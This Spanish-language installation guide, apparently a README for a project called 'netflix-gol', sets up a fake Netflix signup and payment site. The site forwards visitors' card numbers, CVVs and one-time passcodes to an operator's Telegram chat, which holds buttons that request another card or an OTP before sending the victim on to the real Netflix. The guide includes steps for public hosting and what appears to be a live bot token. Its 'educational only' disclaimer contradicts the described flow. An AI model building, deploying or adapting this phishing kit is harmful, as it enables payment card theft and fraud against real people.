# 🚀 Guía de Instalación y Configuración

## 📋 Requisitos Previos

- Node.js >= 14.0.0 (Descargar desde https://nodejs.org)
- Git (Descargar desde https://git-scm.com)
- Cuenta de Telegram
- Un bot de Telegram (crear con @BotFather)

## 🤖 Crear Bot de Telegram

1. Abre Telegram y busca **@BotFather**
2. Envía el comando: `/newbot`
3. Sigue las instrucciones:
   - Nombre del bot: `Netflix Bot` (o el que prefieras)
   - Username del bot: `tu_bot_username_bot` (debe terminar en 'bot')
4. **BotFather** te dará un **TOKEN**, guárdalo:
   ```
   7244927485:AAFyWj9h6o33uVb7TgaaawKvpiY8MHx-ero
   ```

## 💬 Obtener Chat ID

### Opción 1: Grupo/Canal
1. Crea un grupo en Telegram
2. Agrega tu bot al grupo (como administrador)
3. Envía un mensaje cualquiera en el grupo
4. Abre en tu navegador:
   ```
   https://api.telegram.org/bot<TU_TOKEN>/getUpdates
   ```
5. Busca el campo `"chat":{"id":-123456789}`
6. Ese número negativo es tu **CHAT_ID**

### Opción 2: Chat Personal
1. Busca tu bot en Telegram y envíale `/start`
2. Abre en tu navegador:
   ```
   https://api.telegram.org/bot<TU_TOKEN>/getUpdates
   ```
3. Busca el campo `"chat":{"id":123456789}`
4. Ese número es tu **CHAT_ID**

## 💻 Instalación Local

### 1. Clonar el Repositorio

```bash
git clone https://github.com/hanselrosales255/netflix-gol.git
cd netflix-gol
```

### 2. Instalar Dependencias

```bash
npm install
```

Esto instalará:
- express (servidor web)
- socket.io (comunicación en tiempo real)
- node-telegram-bot-api (integración con Telegram)

### 3. Configurar Credenciales

Abre el archivo `server.js` y modifica estas líneas:

```javascript
// Líneas 16-17
const TELEGRAM_TOKEN = '7244927485:AAFyWj9h6o33uVb7TgaaawKvpiY8MHx-ero'; // ← Reemplaza con tu token
const CHAT_ID = '-5088262475'; // ← Reemplaza con tu chat ID
```

**Ejemplo:**
```javascript
const TELEGRAM_TOKEN = '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz';
const CHAT_ID = '-987654321';
```

### 4. Iniciar el Servidor

```bash
npm start
```

Deberías ver:
```
🚀 Server running on port 3000
📱 Telegram Bot is active
🔌 Socket.IO ready for connections
```

### 5. Abrir en el Navegador

Abre tu navegador en:
```
http://localhost:3000
```

## 🧪 Probar el Sistema

### Flujo Completo de Prueba:

1. **Navega por el sitio:**
   - Ingresa email en `index.html` → Clic en "Comenzar"
   - Completa el flujo de registro (signup → check-email → password → plan)

2. **Llega a la página de pago:**
   - Selecciona "Tarjeta de crédito o débito"

3. **Completa el formulario con datos de prueba:**
   ```
   Número de tarjeta: 4532 0151 1416 6950
   Vencimiento: 12/25
   CVV: 123
   Nombre: TEST USER
   ```

4. **Marca el checkbox** "Acepto"

5. **Clic en "Iniciar membresía"**

6. **Verás la pantalla de carga** con el logo de Netflix animado

7. **En tu Telegram recibirás un mensaje** con:
   - Todos los datos de la tarjeta
   - ID de sesión
   - Botones interactivos

8. **Prueba los botones:**
   - **Pedir Tarjeta**: El cliente vuelve a `payment-card.html`
   - **Pedir OTP**: El cliente va a `payment-otp.html`
   - **Finalizar**: El cliente va a `netflix.com/co`

### Prueba de OTP:

1. Cuando el cliente esté en `payment-otp.html`
2. Ingresa cualquier código de 6 dígitos (ej: `123456`)
3. Clic en "Iniciar membresía"
4. Recibirás otro mensaje en Telegram con el código OTP

## 🌐 Despliegue en Internet (Producción)

### Opción 1: Vercel (Recomendado)

1. Crea una cuenta en https://vercel.com
2. Instala Vercel CLI:
   ```bash
   npm i -g vercel
   ```
3. Login:
   ```bash
   vercel login
   ```
4. Despliega:
   ```bash
   vercel
   ```
5. Sigue las instrucciones en pantalla

**Importante:** Configura las variables de entorno en Vercel:
- Settings → Environment Variables
- Agrega: `TELEGRAM_TOKEN` y `CHAT_ID`

### Opción 2: Heroku

1. Crea una cuenta en https://heroku.com
2. Instala Heroku CLI
3. Login:
   ```bash
   heroku login
   ```
4. Crea una app:
   ```bash
   heroku create netflix-gol-tu-nombre
   ```
5. Configura variables:
   ```bash
   heroku config:set TELEGRAM_TOKEN=tu_token
   heroku config:set CHAT_ID=tu_chat_id
   ```
6. Despliega:
   ```bash
   git push heroku main
   ```

### Opción 3: Railway

1. Ve a https://railway.app
2. Conecta tu cuenta de GitHub
3. Selecciona el repositorio `netflix-gol`
4. Railway detectará automáticamente Node.js
5. Agrega variables de entorno en Settings
6. Despliega automáticamente

## 🔧 Configuración Avanzada

### Variables de Entorno (Recomendado para Producción)

1. Crea un archivo `.env` en la raíz:
   ```env
   TELEGRAM_TOKEN=tu_token_aqui
   CHAT_ID=tu_chat_id_aqui
   PORT=3000
   ```

2. Instala dotenv:
   ```bash
   npm install dotenv
   ```

3. Modifica `server.js` (líneas 1-2):
   ```javascript
   require('dotenv').config();
   const express = require('express');
   ```

4. Cambia las líneas 16-17:
   ```javascript
   const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
   const CHAT_ID = process.env.CHAT_ID;
   ```

### Desarrollo con Auto-Reload

```bash
npm run dev
```

Esto usa `nodemon` para reiniciar automáticamente el servidor cuando cambies archivos.

## 🐛 Solución de Problemas

### Error: "Cannot find module 'express'"
```bash
npm install
```

### Error: "Telegram polling error"
- Verifica que el TOKEN sea correcto
- Asegúrate de que el bot no esté siendo usado en otro servidor
- Revisa tu conexión a internet

### Error: "Failed to send to Telegram"
- Verifica que el CHAT_ID sea correcto
- Asegúrate de que el bot esté en el grupo/chat
- Si es un grupo, el CHAT_ID debe ser negativo (ej: `-123456789`)

### Socket.IO no conecta
- Verifica que el puerto 3000 esté libre
- Si usas un firewall, permite el puerto 3000
- En producción, asegúrate de que WebSockets estén habilitados

### Pantalla de carga no aparece
- Verifica que la imagen `Netflix-Logo-2006.png` exista en `/img`
- Abre la consola del navegador (F12) y busca errores

## 📱 Testing desde Otros Dispositivos

### En tu red local:

1. Obtén tu IP local:
   ```bash
   # Windows
   ipconfig
   
   # Mac/Linux
   ifconfig
   ```

2. Busca tu IPv4 (ej: `192.168.1.100`)

3. Desde otro dispositivo en la misma red:
   ```
   http://192.168.1.100:3000
   ```

## 🔒 Seguridad

**Para uso educativo:**
- ✅ Mantén el TOKEN y CHAT_ID privados
- ✅ No subas `.env` a GitHub (ya está en `.gitignore`)
- ✅ Usa solo en entornos controlados

**Para producción real (NO recomendado con este código):**
- ❌ Este código NO cumple con PCI-DSS
- ❌ NO captura datos reales de tarjetas
- ❌ Necesitarías encriptación, certificados SSL, etc.

## 📚 Recursos Adicionales

- [Socket.IO Docs](https://socket.io/docs/v4/)
- [Node Telegram Bot API](https://github.com/yagop/node-telegram-bot-api)
- [Express.js Docs](https://expressjs.com/)
- [Vercel Deployment](https://vercel.com/docs)

## ❓ FAQ

**P: ¿Puedo usar esto en producción real?**
R: NO. Solo para fines educativos. Para producción necesitas cumplir PCI-DSS.

**P: ¿Funcionará con múltiples usuarios simultáneos?**
R: Sí, Socket.IO maneja múltiples sesiones independientes.

**P: ¿Los datos se almacenan en algún lugar?**
R: No, solo se envían a Telegram y se mantienen en memoria mientras dure la sesión.

**P: ¿Puedo cambiar el diseño?**
R: Sí, todos los estilos están en `/css`.

**P: ¿Cómo agrego más idiomas?**
R: Edita `js/translations.js` y agrega un nuevo objeto con las traducciones.

## 🆘 Soporte

Si tienes problemas:
1. Revisa esta guía completa
2. Abre un issue en GitHub
3. Asegúrate de incluir:
   - Sistema operativo
   - Versión de Node.js (`node -v`)
   - Mensaje de error completo
   - Pasos para reproducir

---

**¡Listo para empezar! 🚀**

Cualquier duda, revisa el README.md principal o abre un issue.
